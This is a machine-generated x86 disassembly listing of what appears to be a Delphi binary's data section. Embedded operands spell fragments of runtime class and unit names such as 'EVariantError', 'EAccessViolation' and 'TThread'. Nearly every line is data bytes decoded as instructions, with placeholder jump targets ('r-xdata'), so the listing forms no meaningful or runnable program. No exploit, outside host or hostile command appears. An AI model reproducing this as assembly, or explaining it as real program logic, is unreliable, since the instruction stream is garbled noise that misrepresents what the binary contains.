add [ esi ] dl
jb r-xdata
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
insb
inc ebx
adc ch ch
inc eax
add al ah
loop r-xdata
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc eax
add [ edi ] al
or [ ebp + 0x43 ] eax
outsd
outsb
je r-xdata
outsd
insb
inc ebx
mov eax eax
sub ch ch
inc eax
add [ eax ] dl
inc ecx
insb
outsd
ja r-xdata
inc ecx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
movsb [ edi ] [ esi ]
in eax dx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
in eax dx
inc eax
rol al 0xed
inc eax
add [ edi ] al
or eax 0x72615645
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
jo r-xdata
mov esp gs
inc eax
add [ edi ] al
push cs
inc ebp
push ebx
je r-xdata
add [ eax + 0x58004166 ] bh
inc cx
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsd
jb r-xdata
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
in eax dx
inc eax
add al ah
fadd [ eax ]
add [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
je r-xdata
push ebp
je r-xdata
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add al dl
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ 0x6e6f4345 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
mov al [ 0x1c0040ea ]
0xdce00040 0x40
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ eax ] dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] cl
inc eax
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
insb
jae r-xdata
int3
je r-xdata
add [ eax - 0x2fffbfa8 ] dh
add [ eax ] al
mov esp gs
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x14 ] bh
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax - 0x1e ] dl
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
fcomp [ eax + 0x40 ]
jb r-xdata
adc [ edi + 0x41 ] ah
jb r-xdata
inc ebp
inc ecx
jae r-xdata
insb
jae r-xdata
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
outsd
jb r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
add [ eax ] dl
inc ecx
popad
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 8 + 0x1c0040 ] ch
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebp + ebp * 8 + 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr ch 0x40
add [ esi ] cl
inc ebp
push ebx
je r-xdata
inc ecx
insb
jae r-xdata
insb
outsd
ja r-xdata
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
mov al 0x58
inc eax
add al dl
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
pushad
out dx al
inc eax
add [ edi ] al
adc [ ebp + 0x41 ] al
jae r-xdata
add [ eax ] al
add [ edx ] al
add [ eax - 0x12 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x12 ] ah
inc eax
add [ eax ] al
add [ edx ] al
add [ ebp - 0x138fffc0 ] cl
add [ eax + 0x58004166 ] bh
inc cx
inc cx
in al dx
inc eax
add al ah
loop r-xdata
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
inc ebx
popad
jae r-xdata
pop eax
jb r-xdata
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ esi ] cl
push ebp
inc eax
add [ ebp + edx * 2 + 0x66140040 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
jb r-xdata
inc eax
inc ebp
jb r-xdata
add [ eax - 0x2fffbfa8 ] dh
in al 0xee
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx eax
add bh ch
inc eax
add [ edi ] al
push cs
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
push ebp
inc eax
add [ esi ] dl
imul ebp [ edi + 0x6e ] 0x6c696146
inc eax
out dx al
inc eax
add al ah
fadd [ eax ]
add [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
je r-xdata
push ebp
je r-xdata
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add ah dh
outsd
add al [ gs : eax ]
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
add ah dl
outsd
jb r-xdata
inc eax
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
inc eax
add [ eax - 0x5bffbfab ] cl
je r-xdata
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
inc ecx
insb
jae r-xdata
inc cx
pop eax
inc eax
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
add ah dl
rcr [ eax + 0x40 ] 0x1
imul ebp [ edi + 0x6e ] 0x40f0f490
add [ edi ] al
adc al [ ebp + 0x53 ]
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
outsd
jb r-xdata
test bh ch
mov al [ 0x70040ef ]
push cs
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
jb r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
push cs
insb
jae r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0x12efffc0 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
in eax dx
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
in eax dx
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax - 0x1e ] dl
inc eax
outsd
jb r-xdata
push ebp
je r-xdata
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
jo r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add [ eax + esi * 8 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x10 ] cl
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
rcr [ eax - 0x10 ] 0x40
add [ edi ] al
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
inc ebx
popad
jae r-xdata
je r-xdata
out dx al
inc eax
add al ah
fadd [ eax ]
add [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
out dx al
inc eax
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax ] al
add [ edx ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xf2
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc eax
add [ eax + eax ] bl
add [ eax ] al
and al 0xf1
outsd
arpl [ ebx + 0x45 ] bp
js r-xdata
adc eax 0x6e6f4d45
insb
jae r-xdata
add [ eax + 0x58004166 ] bh
inc cx
imul ebp [ edi + 0x6e ] r-xdata
loopne r-xdata
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
outsd
jb r-xdata
add [ esi ] dl
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x1c0040 ] cl
add [ eax ] al
dec esp
mov al [ 0x40ef ]
jb r-xdata
int3
je r-xdata
cmp dh [ esi + 0x4 ]
inc ebp
js r-xdata
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
add [ ecx + esi * 8 ] ah
jo r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] 0x6b636f4c
inc ebp
add [ eax ] al
add [ edx ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xf2
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc eax
add [ eax + eax ] bl
add [ eax ] al
and al 0xf1
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
add [ 0x6e6f4d45 ] dl
jo r-xdata
inc eax
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
adc al 0x66
outsd
jb r-xdata
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
outsd
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc ecx
insb
jae r-xdata
add al [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add al [ gs : eax ]
clc
adc [ eax ] al
or al 0x0
add [ eax ] al
add cl [ esi ]
push edx
arpl [ gs : ebp + 0x72 ] si
jae r-xdata
push ebp
insb
jo r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add al dl
imul ebp [ edi + 0x6e ] 0xf234c08b
inc eax
add [ edi ] al
adc eax 0x6e6f4d45
imul esi [ edi + ebp * 2 + 0x72 ] 0x6b636f4c
inc ebp
js r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] 0x9400408d
int1
inc eax
add [ edi ] al
or [ ebp + 0x4d ] al
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
loopne r-xdata
push ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40ef ] ah
out dx eax
inc eax
add al ah
fadd [ eax ]
add [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebp - 0x107bffc0 ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
outsd
outsb
inc ebx
outsd
jne r-xdata
push 0x64616572
dec ecx
inc esp
insb
jae r-xdata
add [ ebx + ecx ] dl
push eax
push esp
inc eax
adc al [ eax ]
dec edx
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
push ebx
jns r-xdata
adc al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ edx ] cl
add [ eax ] al
inc eax
adc al [ eax ]
imul ebp [ edi + 0x6e ] 0x40f2e490
add [ edi ] al
sbb al [ ebp + 0x4e ]
outsd
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x70707553
outsd
jb r-xdata
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
fcomp [ eax + 0x40 ]
jo r-xdata
add [ eax ] cl
inc ebp
dec ebp
outsd
outsb
inc ecx
insb
jae r-xdata
int3
je r-xdata
enter 0x4186 0x0
add al 0x4f
jo r-xdata
push esp
popad
bound ebp [ ebp + 0x2 ]
add [ eax ] al
add [ eax + eax ] al
mov dl 0xf4
inc eax
add [ ebp ] cl
or al [ esi + 0x48 ]
popad
jae r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
adc al [ eax ]
add al [ eax ]
mov al 0x4
add al [ eax ]
pop esp
hlt
popad
dec ecx
outsb
outsw
add [ eax ] al
add [ edx ] al
add al 0x4e
js r-xdata
je r-xdata
add [ eax - 0xfffdfc ] dh
inc ebp
js r-xdata
inc cx
add [ edx ] bl
mov eax 0x58004166
imul ebp [ edi + 0x6e ] r-xdata
nop
int1
inc eax
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0xe83ffc0 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test cl dh
inc eax
add [ eax + eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ edx ] al
clc
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
or [ ebp + 0x72 ] eax
jb r-xdata
inc ecx
insb
jae r-xdata
add [ 0x736f6c43 ] al
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
add [ eax ] al
add [ esp + esi * 8 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x40 ] bh
add [ esp + esi * 8 + 0x40 ] bl
add [ edx - 0xc ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ esi + 0x480040f4 ] bl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
add [ edx ] al
inc eax
add [ eax ] al
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi + eax * 4 + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
mov ah 0x56
add al [ eax ]
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
push esp
or [ ebx + 0x79 ] dl
jae r-xdata
jo r-xdata
je r-xdata
push ebp
je r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0xfdbffc0 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x10 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0xb ] bh
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebx + esi * 8 + 0x40 ] edi
add [ ecx ] al
add [ esi ] al
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0xb ] bh
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebx + esi * 8 + 0x40 ] edi
add [ ecx ] al
add [ esi ] al
push esp
push 0x64616572
add al [ eax ]
add al [ eax ]
add [ ss : eax - 0x79 ] cl
inc ecx
add [ esi ] al
inc esp
insb
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
nop
int1
inc eax
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
jae r-xdata
jb r-xdata
inc ebp
dec esi
outsd
dec ebp
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x70707553
outsd
insb
jae r-xdata
push 0x64616572
add al [ eax ]
add al [ eax ]
jl r-xdata
inc eax
add [ edi ] al
adc edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
push esp
push 0x64616572
dec esp
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
js r-xdata
push 0x64616572
dec ecx
outsb
outsw
xchg esp eax
inc eax
add [ edx ] al
add [ eax + r-xdata ] dl
push cs
or edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
or edx [ eax + 0x54 ]
push ebp
je r-xdata
xor esi [ 0x4 ]
inc eax
adc al [ eax ]
dec edx
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] cl
push ebx
jns r-xdata
jne r-xdata
add [ eax ] al
add [ edx ] al
add [ edx + esi * 8 + 0x40 ] bh
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsd
jne r-xdata
popad
dec esp
mov ch 0xf5
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0xb ] bh
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebx + esi * 8 + 0x40 ] edi
add [ ecx ] al
add [ esi ] al
push esp
push 0x64616572
add al [ eax ]
add al [ eax ]
xor eax 0x41874000
add [ eax ] al
xor bl 0x40
insb
jae r-xdata
add [ eax ] al
jl r-xdata
add [ eax ] al
add al 0x0
push ebp
je r-xdata
add al [ eax ]
dec eax
inc eax
jo r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
or [ esi + 0x53 ] eax
outsb
je r-xdata
sbb [ 0x40f5ec3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dh 0x40
add [ eax ] cl
test [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffbf08 ] dl
test [ eax ] 0x42
inc eax
add [ ebp - 0x3affbf0b ] bh
cmc
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
cmc
inc eax
add [ ebp - 0x4affbf0b ] ch
cmc
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ ebp - 0xcdfffc0 ] cl
inc eax
add [ ecx ] dl
add edi [ edx ]
adc [ eax ] al
add [ ecx ] dl
add edi [ edx ]
xor al 0x35
add al 0x0
add [ eax ] al
add [ eax - 0xd ] cl
inc eax
jb r-xdata
je r-xdata
outsb
insb
add al [ eax ]
add al bh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or eax [ esi + 0x52 ]
popad
push ebx
imul esp [ edi + 0x6e ] 0x26c61
add al bh
adc [ eax ] al
adc al 0x0
add [ eax ] al
or al 0x46
push edi
jb r-xdata
test [ eax ] 0x0
jbe r-xdata
inc eax
add [ eax + eax ] dh
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al 0x40
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 - 0x77efffc0 ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
pushfd
inc eax
add bh dl
cmc
inc eax
add cl ah
hlt
js r-xdata
add [ eax ] al
inc eax
add [ eax ] ch
add [ eax ] al
add [ esi ] cl
je r-xdata
outsb
inc ebx
outsd
jne r-xdata
inc eax
add [ eax ] ah
add [ eax ] al
add [ ebx ] al
je r-xdata
add [ esi ] al
jae r-xdata
inc esi
push edx
jbe r-xdata
clc
push ebx
imul esp [ edi + 0x6e ] 0x26c61
add al bh
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
or al 0x46
push edi
popad
imul esi [ edx + edx * 2 + 0x65 ] 0x6c637963
add al [ gs : eax ]
add al bh
adc [ eax ] al
sbb al 0x0
add [ eax ] al
adc al 0x46
push edi
jb r-xdata
clc
inc eax
add [ edx ] al
hlt
imul edx [ edx + 0x65 ] 0x78456461
arpl [ ebp + esi * 2 + 0x73 ] bp
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jae r-xdata
insb
add al [ eax ]
popad
inc ebx
jb r-xdata
outsd
outsb
dec esp
jbe r-xdata
add ah dh
call [ ecx ]
clc
inc eax
add [ edx ] al
je r-xdata
add [ eax ] eax
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] 0x9c002672
xchg [ ecx ] eax
push es
clc
adc [ eax ] al
and al 0x0
add [ eax ] al
or [ esi + 0x57 ] eax
jb r-xdata
add [ eax ] al
add al [ eax ]
daa
add [ eax ] cl
mov al [ ecx ]
pop es
inc ebp
outsb
push edx
popad
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add al [ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
je r-xdata
popad
insb
add al [ eax ]
add [ eax ] al
push es
add [ ebx + 0x440040f7 ] bl
add ah dh
inc ecx
test [ eax ] 0xffff004d
call 0x42413852
add [ edx ] al
hlt
push edx
arpl [ gs : ebp + 0x72 ] si
jae r-xdata
push edi
jb r-xdata
je r-xdata
hlt
outsd
popad
je r-xdata
jbe r-xdata
jb r-xdata
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
push edx
popad
jns r-xdata
push ebx
inc edx
imul ebp [ gs : bp + 0x52 ] 0x3646165
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + edi * 8 + 0x40 ] cl
add al 0x53
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
push cs
inc esp
add al [ eax ]
add al bh
sub_40f5ec
int 0xf5
inc eax
add bh dl
cmc
inc eax
add cl ah
cmc
inc eax
add [ ebp - 0x4affbf0b ] ch
cmc
inc eax
add [ ebp - 0x3affbf0b ] bh
cmc
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
or [ esi + 0x53 ] eax
outsb
je r-xdata
sbb [ 0x40f5ec3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dh 0x40
add [ eax ] cl
test [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7fffbf08 ] dl
test [ eax ] 0x42
je r-xdata
outsb
insb
add al [ eax ]
add al bh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or eax [ esi + 0x52 ]
popad
push ebx
imul esp [ edi + 0x6e ] 0x26c61
add al bh
adc [ eax ] al
adc al 0x0
add [ eax ] al
or al 0x46
push edi
jb r-xdata
test [ eax ] 0x0
jbe r-xdata
inc eax
add [ eax + eax ] dh
add [ eax ] al
movsb [ edi ] [ esi ]
sbb al 0x40
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 - 0x77efffc0 ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
pushfd
js r-xdata
add [ eax ] al
inc eax
add [ eax ] ch
add [ eax ] al
add [ esi ] cl
je r-xdata
outsb
inc ebx
outsd
jne r-xdata
inc eax
add [ eax ] ah
add [ eax ] al
add [ ebx ] al
je r-xdata
add [ esi ] al
jae r-xdata
inc esi
push edx
jbe r-xdata
clc
push ebx
imul esp [ edi + 0x6e ] 0x26c61
add al bh
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
or al 0x46
push edi
popad
imul esi [ edx + edx * 2 + 0x65 ] 0x6c637963
add al [ gs : eax ]
add al bh
adc [ eax ] al
sbb al 0x0
add [ eax ] al
adc al 0x46
push edi
jb r-xdata
clc
inc eax
add [ edx ] al
hlt
imul edx [ edx + 0x65 ] 0x78456461
arpl [ ebp + esi * 2 + 0x73 ] bp
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jae r-xdata
insb
add al [ eax ]
popad
inc ebx
jb r-xdata
outsd
outsb
dec esp
jbe r-xdata
add ah dh
call [ ecx ]
clc
inc eax
add [ edx ] al
je r-xdata
add [ eax ] eax
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] 0x9c002672
xchg [ ecx ] eax
push es
clc
adc [ eax ] al
and al 0x0
add [ eax ] al
or [ esi + 0x57 ] eax
jb r-xdata
add [ eax ] al
add al [ eax ]
daa
add [ eax ] cl
mov al [ ecx ]
pop es
inc ebp
outsb
push edx
popad
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add al [ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
je r-xdata
popad
insb
add al [ eax ]
add [ eax ] al
push es
add [ ebx + 0x440040f7 ] bl
add ah dh
inc ecx
test [ eax ] 0xffff004d
call 0x42413852
add [ edx ] al
hlt
push edx
arpl [ gs : ebp + 0x72 ] si
jae r-xdata
push edi
jb r-xdata
je r-xdata
hlt
outsd
popad
je r-xdata
jbe r-xdata
jb r-xdata
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
push edx
popad
jns r-xdata
push ebx
inc edx
imul ebp [ gs : bp + 0x52 ] 0x3646165
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + edi * 8 + 0x40 ] cl
add al 0x53
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
push cs
inc esp
add al [ eax ]
add al bh
sub_40f7b3
clc
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
add [ eax ] dl
mov [ ecx ] al
pop es
inc esp
jae r-xdata
imul ebp [ gs : bp + 0x57 ] 0x65746972
add eax [ eax ]
